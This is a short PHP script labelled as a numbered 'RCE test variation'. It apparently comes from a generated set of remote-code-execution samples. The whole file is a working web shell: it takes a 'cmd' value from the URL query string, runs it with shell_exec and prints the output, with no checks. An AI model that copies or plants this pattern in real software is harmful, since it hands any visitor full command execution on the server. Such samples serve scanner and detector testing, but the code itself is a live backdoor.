<?php
// RCE test variation #343
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>